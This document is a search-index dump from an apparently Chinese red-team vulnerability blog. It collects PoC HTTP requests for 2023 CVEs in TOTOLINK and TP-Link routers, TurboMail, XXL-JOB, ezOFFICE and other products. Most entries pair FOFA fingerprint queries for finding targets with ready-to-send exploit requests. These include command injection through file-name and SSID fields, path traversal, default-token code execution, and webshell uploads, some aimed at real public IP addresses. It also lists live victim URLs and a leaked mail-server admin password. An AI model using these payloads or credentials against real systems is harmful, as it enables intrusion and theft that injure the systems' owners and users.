(Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/601.7.8', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/51.0.2704.79 Chrome/51.0.2704.79 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.3","date":"2023-12-08","objectID":"/sysaid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-47246/:4:0","tags":["2023hw漏洞"],"title":"SysAid远程命令执行漏洞（CVE-2023-47246）","uri":"/sysaid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-47246/"},{"categories":["2023hw漏洞"],"content":"漏洞脚本来源 https://github.com/W01fh4cker/CVE-2023-47246-EXP ","date":"2023-12-08","objectID":"/sysaid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-47246/:5:0","tags":["2023hw漏洞"],"title":"SysAid远程命令执行漏洞（CVE-2023-47246）","uri":"/sysaid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-47246/"},{"categories":["2023hw"],"content":"## fofa\r(title=\"Tenda | LOGIN\" || title=\"Tenda|登录\" || title==\"Tenda\" || (title=\"Tenda \" \u0026\u0026 title=\"Router\") || (body=\"('TENDA '+sys_target+' Router');\" \u0026\u0026 body!=\"href=\\\\\\\"http://www.nexxtsolutions.com/\") || server=\"access to tenda \" || body=\"background:url(tenda-logo-big.png)\" || body=\"/css/tenda.css\" || title=\"TENDA 11N无线路由器登录界面\" || (title=\"Tenda Web Master\" \u0026\u0026 (body=\"router to restore\" || body=\"router and reset\")) || title==\"Tenda Wireless Router\") \u0026\u0026 header!=\"360 web server\" \u0026\u0026 body!=\"Server: couchdb\" ","date":"2023-12-08","objectID":"/tenda-%E8%B7%AF%E7%94%B1%E5%99%A8-downloadcfg-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"Tenda 路由器 DownloadCfg 信息泄露漏洞","uri":"/tenda-%E8%B7%AF%E7%94%B1%E5%99%A8-downloadcfg-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc GET /cgi-bin/DownloadCfg.jpg HTTP/1.1 Host: 101.255.160.5 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/tenda-%E8%B7%AF%E7%94%B1%E5%99%A8-downloadcfg-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"Tenda 路由器 DownloadCfg 信息泄露漏洞","uri":"/tenda-%E8%B7%AF%E7%94%B1%E5%99%A8-downloadcfg-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"TOTOLINK A3700R命令执行漏洞CVE-2023-46574 TOTOLINK A3700R v9.1.2u.6165_20211012版本存在命令执行漏洞，攻击者可利用该漏洞通过UploadFirmwareFile函数的FileName参数执行任意代码。 ","date":"2023-12-08","objectID":"/totolink-a3700r%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46574/:1:0","tags":["2023hw漏洞"],"title":"TOTOLINK A3700R命令执行漏洞CVE-2023-46574","uri":"/totolink-a3700r%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46574/"},{"categories":["2023hw漏洞"],"content":"影响版本： TOTOLINK A3700R v9.1.2u.6165_20211012 ","date":"2023-12-08","objectID":"/totolink-a3700r%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46574/:2:0","tags":["2023hw漏洞"],"title":"TOTOLINK A3700R命令执行漏洞CVE-2023-46574","uri":"/totolink-a3700r%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46574/"},{"categories":["2023hw漏洞"],"content":"poc POST /cgi-bin/cstecgi.cgi HTTP/1.1 Host: 192.168.122.15 Content-Length: 73 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://192.168.122.15 Referer: http://192.168.122.15/basic/index.html?time=1697964093345 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: SESSION_ID=2:1697964047:2 Connection: close {\"topicurl\":\"UploadFirmwareFile\",\"FileName\":\";ls;\"} ","date":"2023-12-08","objectID":"/totolink-a3700r%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46574/:3:0","tags":["2023hw漏洞"],"title":"TOTOLINK A3700R命令执行漏洞CVE-2023-46574","uri":"/totolink-a3700r%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46574/"},{"categories":["2023hw漏洞"],"content":"来源 https://github.com/OraclePi/repo/blob/main/totolink%20A3700R/1/A3700R%20%20V9.1.2u.6165_20211012%20vuln.md ","date":"2023-12-08","objectID":"/totolink-a3700r%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46574/:4:0","tags":["2023hw漏洞"],"title":"TOTOLINK A3700R命令执行漏洞CVE-2023-46574","uri":"/totolink-a3700r%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-46574/"},{"categories":["2023hw漏洞"],"content":"TP-LINKTL-WR940N 命令执行漏洞（CVE-2023-33538) The PoC of TL-WR940NV4 is as follows: GET /JFYRUKOAPAQZRKOC/userRpm/WlanNetworkRpm.htm?ssid1=TP-LINK_000012||reboot;\u0026ssid2= TP-LINK_0000_2\u0026ssid3=TP-LINK_0000_3\u0026ssid4=TP-LINK_0000_4\u0026region=101\u0026band=0\u0026mode=6 \u0026chanWidth=2\u0026channel=15\u0026rate=83\u0026ap=1\u0026broadcast=2\u0026brlssid=\u0026brlbssid=\u0026addrType=1\u0026key type=1\u0026wepindex=1\u0026authtype=1\u0026keytext=\u0026Save=Save HTTP/1.1 Host: 127.0.0.1:8081 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: keep-alive Referer: http://127.0.0.1:8081/JFYRUKOAPAQZRKOC/userRpm/WlanNetworkRpm.htm Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3 D Upgrade-Insecure-Requests: 1 The PoC of TL-WR940NV2 is as follows: GET /UJOGPJXBZUFEBUDB/userRpm/WlanNetworkRpm.htm?ssid1=;reboot;\u0026ssid2=TP-LINK_0000_2\u0026 ssid3=TP-LINK_0000_3\u0026ssid4=TP-LINK_0000_4\u0026region=101\u0026band=0\u0026mode=5\u0026chanWidth=1\u0026c hannel=9\u0026rate=59\u0026ap=1\u0026broadcast=2\u0026brlssid=\u0026brlbssid=\u0026addrType=1\u0026keytype=1\u0026wepindex =1\u0026authtype=1\u0026keytext=\u0026Save=Save HTTP/1.1 Host: 192.168.0.1 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Referer: http://192.168.0.1/KMODQNKANSQJBYFA/userRpm/WlanNetworkRpm.htm Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3 D Upgrade-Insecure-Requests: 1 The PoC of TL-WR841N V8 is as follows: GET /userRpm/WlanNetworkRpm.htm?ssid1=a;reboot\u0026ssid2=TP-LINK_000000_2\u0026ssi d3=TP-LINK_000000_3\u0026ssid4=TP-LINK_000000_4\u0026region=101\u0026band=0\u0026mode=3\u0026c hanWidth=2\u0026channel=15\u0026rate=71\u0026ap=1\u0026broadcast=2\u0026brlssid=\u0026brlbssid=\u0026add rType=1\u0026keytype=1\u0026wepindex=1\u0026authtype=1\u0026keytext=\u0026Save=Save HTTP/1.1 Host: 0.0.0.0:49168 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*; q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Authorization: Basic YWRtaW46YWRtaW4= Connection: close Referer: http://0.0.0.0:49168/userRpm/WlanNetworkRpm.htm Cookie: Authorization= Upgrade-Insecure-Requests: 1 The PoC of TL-WR841N V10 is as follows: GET /GWIDNCGBKQNKXJXB/userRpm/WlanNetworkRpm.htm?ssid1=a;reboot;\u0026ssid2=TP -LINK_0000_2\u0026ssid3=TP-LINK_0000_3\u0026ssid4=TP-LINK_0000_4\u0026region=101\u0026ban d=0\u0026mode=5\u0026chanWidth=2\u0026channel=15\u0026rate=71\u0026ap=1\u0026broadcast=2\u0026brlssid=\u0026b rlbssid=\u0026addrType=1\u0026keytype=1\u0026wepindex=1\u0026authtype=1\u0026keytext=\u0026Save=Sav e HTTP/1.1 Host: 127.0.0.1:8081 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,imag e/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: keep-alive Referer: http://127.0.0.1:8081/GWIDNCGBKQNKXJXB/userRpm/WlanNetworkRpm.htm Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDF mYzM%3D Upgrade-Insecure-Requests: 1 ","date":"2023-12-08","objectID":"/tp-linktl-wr940n-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-33538/:1:0","tags":["2023hw漏洞"],"title":"TP-LINKTL-WR940N 命令执行漏洞（CVE-2023-33538)","uri":"/tp-linktl-wr940n-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-33538/"},{"categories":["2023hw"],"content":"## fofa\rapp=\"TurboMail\" ","date":"2023-12-08","objectID":"/turbomail-%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-viewfile-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"TurboMail 邮件系统 viewfile 文件读取漏洞","uri":"/turbomail-%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-viewfile-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc http://113.108.253.183:8081/viewfile?type=cardpic\u0026mbid=1\u0026msgid=2\u0026logtype=3\u0026view=true\u0026cardid=/accounts/root/postmaster\u0026cardclass=../\u0026filename=/account.xml username :postmaster password :Dgmf7690 http://113.108.253.183:8081/maintlogin.jsp ","date":"2023-12-08","objectID":"/turbomail-%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-viewfile-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"TurboMail 邮件系统 viewfile 文件读取漏洞","uri":"/turbomail-%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-viewfile-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"案例 URL http://113.108.253.183:8081http://113.98.99.130:9090http://114.221.154.248:8081http://123.124.56.127:8090http://183.230.47.186:8090 ","date":"2023-12-08","objectID":"/turbomail-%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-viewfile-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"TurboMail 邮件系统 viewfile 文件读取漏洞","uri":"/turbomail-%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F-viewfile-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"WEBMAIL存在任意用户登录漏洞 RmWeb/noCookiesMail?func=user:getPassword\u0026userMailName=admin 回显errormsg为密码 用户名为 admin 添加头 X-Forwarded-For: 127.0.0.1 如果有登录失败的话，使用 /RmWeb/noCookiesMail?func=user:getPassword\u0026userMailName=admin@+证书 or 根域名获取 errormsg 登录 ","date":"2023-12-08","objectID":"/webmail%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"WEBMAIL存在任意用户登录漏洞","uri":"/webmail%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"CVE-2023-38831 ","date":"2023-12-08","objectID":"/winrar-cve-2023-38831/:1:0","tags":["2023hw漏洞"],"title":"WinRAR CVE-2023-38831","uri":"/winrar-cve-2023-38831/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 https://mp.weixin.qq.com/s/UXWW7nuu52r7p6x9R3EcNA ","date":"2023-12-08","objectID":"/winrar-cve-2023-38831/:2:0","tags":["2023hw漏洞"],"title":"WinRAR CVE-2023-38831","uri":"/winrar-cve-2023-38831/"},{"categories":["2023hw漏洞"],"content":"XXL-JOB默认accessToken身份绕过漏洞 ","date":"2023-12-08","objectID":"/xxl-job%E9%BB%98%E8%AE%A4accesstoken%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"XXL-JOB默认accessToken身份绕过漏洞","uri":"/xxl-job%E9%BB%98%E8%AE%A4accesstoken%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞影响 2.3.1和2.4 ","date":"2023-12-08","objectID":"/xxl-job%E9%BB%98%E8%AE%A4accesstoken%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"XXL-JOB默认accessToken身份绕过漏洞","uri":"/xxl-job%E9%BB%98%E8%AE%A4accesstoken%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc 请求头加上XXL-JOB-ACCESS-TOKEN: default_token POST /run HTTP/1.1 Host: 127.0.0.1:9999 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate DNT: 1 Connection: close XXL-JOB-ACCESS-TOKEN: default_token Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Content-Length: 365 { \"jobId\": 1, \"executorHandler\": \"demoJobHandler\", \"executorParams\": \"demoJobHandler\", \"executorBlockStrategy\": \"SERIAL_EXECUTION\", \"executorTimeout\": 0, \"logId\": 1, \"logDateTime\": 1586629003729, \"glueType\": \"GLUE_POWERSHELL\", \"glueSource\": \"calc.exe\", \"glueUpdatetime\": 1586699003758, \"broadcastIndex\": 0, \"broadcastTotal\": 0 } ","date":"2023-12-08","objectID":"/xxl-job%E9%BB%98%E8%AE%A4accesstoken%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"XXL-JOB默认accessToken身份绕过漏洞","uri":"/xxl-job%E9%BB%98%E8%AE%A4accesstoken%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 https://mp.weixin.qq.com/s/9vcIRCbKyisFq3vPXmiMkQ https://www.cnblogs.com/chm0d/p/17805168.html ","date":"2023-12-08","objectID":"/xxl-job%E9%BB%98%E8%AE%A4accesstoken%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"XXL-JOB默认accessToken身份绕过漏洞","uri":"/xxl-job%E9%BB%98%E8%AE%A4accesstoken%E8%BA%AB%E4%BB%BD%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rapp=\"云时空社会化商业ERP系统\" 默认key http://120.209.224.111:8090 http://183.166.62.73:8089 http://218.23.123.7:8091 http://218.23.123.7:8099 http://220.180.110.43:8098 http://60.174.74.228:8099 http://60.174.75.133:8099 ","date":"2023-12-08","objectID":"/ysk-erp-shiro-deserialization-vulnerability%E4%BA%91%E6%97%B6%E7%A9%BAshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/:0:0","tags":["2023hw"],"title":"Ysk ERP Shiro Deserialization Vulnerability云时空shiro反序列化","uri":"/ysk-erp-shiro-deserialization-vulnerability%E4%BA%91%E6%97%B6%E7%A9%BAshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"/index.php/index/category/index?id=\" || body=\"css/yunu.css\" ","date":"2023-12-08","objectID":"/yunucms-%E5%9F%8E%E5%B8%82%E5%88%86%E7%AB%99%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-request_uri-%E5%8F%82%E6%95%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"yunucms 城市分站管理系统 request_uri 参数代码执行漏洞","uri":"/yunucms-%E5%9F%8E%E5%B8%82%E5%88%86%E7%AB%99%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-request_uri-%E5%8F%82%E6%95%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /defaultroot/services/FileTest;1.js HTTP/1.1 Host: 111.59.90.19:7001 Pragma: no-cache Cache-Control: no-cache User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Accept: / Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,fil;q=0.6 Connection: close SOAPAction: Content-Type: text/xml;charset=UTF-8 Content-Length: 840 \u003csoapenv:Envelope xmlns:xsi=“http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=“http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=“http://schemas.xmlsoap.org/soap/envelope/\" xmlns:util=“http://com.whir.ezoffice.ezform.util .StringUtil” xmlns:soapenc=“http://schemas.xmlsoap.org/soap/encoding/\"\u003e soapenv:Header/ soapenv:Body \u003cutil:printToFile soapenv:encodingStyle=“http://schemas.xmlsoap.org/soap/encoding/\"\u003e ../server/oa/deploy/defaultroot.war/public/upload/date.jsp. \u003c% out.p\u0026#x 72;int(“hello world !”); %\u003e \u003c/util:printToFile\u003e\u003c/soapenv:Body\u003e\u003c/soapenv:Envelope\u003e ","date":"2023-12-08","objectID":"/%E4%B8%87%E6%88%B7-ezoffice-filetest-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"万户 ezOFFICE FileTest 任意文件上传漏洞","uri":"/%E4%B8%87%E6%88%B7-ezoffice-filetest-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rtitle=\"ezOFFICE协同管理平台\" || title=\"Wanhu ezOFFICE\" || title=\"ezOffice for iPhone\" || body=\"EZOFFICEUSERNAME\" || body=\"whirRootPath\" || body=\"/defaultroot/js/cookie.js\" || header=\"LocLan\" || (banner=\"/defaultroot/sp/login.jsp\" \u0026\u0026 banner=\"Set-Cookie: JSESSIONID=\") || (header=\"Set-Cookie: OASESSIONID=\" \u0026\u0026 (title=\"ezOFFICE\" || body=\"whir.util.js\" || body=\"var ezofficeUserPortal_ = Cookie(\\\"ezofficeUserPortal\\\");\")) ","date":"2023-12-08","objectID":"/%E4%B8%87%E6%88%B7-ezoffice-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-wpsservlet-%E6%8E%A5%E5%8F%A3%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"万户 ezOFFICE 协同办公平台 wpsservlet 接口文件上传漏洞","uri":"/%E4%B8%87%E6%88%B7-ezoffice-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-wpsservlet-%E6%8E%A5%E5%8F%A3%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /defaultroot/wpsservlet?option=saveNewFile\u0026newdocId=01aCCc\u0026dir=../platform/portal/layout/\u0026fileType=.jsp HTTP/1.1 Host: 111.59.90.19:7001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Cache-Control: max-age=0 Content-Type: multipart/form-data; boundary=803e058d60f347f7b3c17fa95228eca6 Referer: http://111.59.90.19:7001 Accept-Encoding: gzip Content-Length: 759 --803e058d60f347f7b3c17fa95228eca6 Content-Disposition: form-data; name=\"NewFile\"; filename=\"01aCCc.jsp\" 111 --803e058d60f347f7b3c17fa95228eca6-- http://111.59.90.19:7001/defaultroot/platform/portal/layout/01aCCc.jsp Password: rebeyond WebShell tool: Behinder v3.0 Webshell type: jsp ","date":"2023-12-08","objectID":"/%E4%B8%87%E6%88%B7-ezoffice-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-wpsservlet-%E6%8E%A5%E5%8F%A3%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"万户 ezOFFICE 协同办公平台 wpsservlet 接口文件上传漏洞","uri":"/%E4%B8%87%E6%88%B7-ezoffice-%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0-wpsservlet-%E6%8E%A5%E5%8F%A3%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"万户OA-upload任意文件上传漏洞 ","date":"2023-12-08","objectID":"/%E4%B8%87%E6%88%B7oa-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"万户OA-upload任意文件上传漏洞","uri":"/%E4%B8%87%E6%88%B7oa-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"万户ezOFFICE协同管理平台\" ","date":"2023-12-08","objectID":"/%E4%B8%87%E6%88%B7oa-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"万户OA-upload任意文件上传漏洞","uri":"/%E4%B8%87%E6%88%B7oa-upload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc POST /defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=123\u0026path=abc HTTP/1.1 Host: your-ip Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed --b0d829daa06c13d6b3e16b0ad21d1eed Content-Disposition: 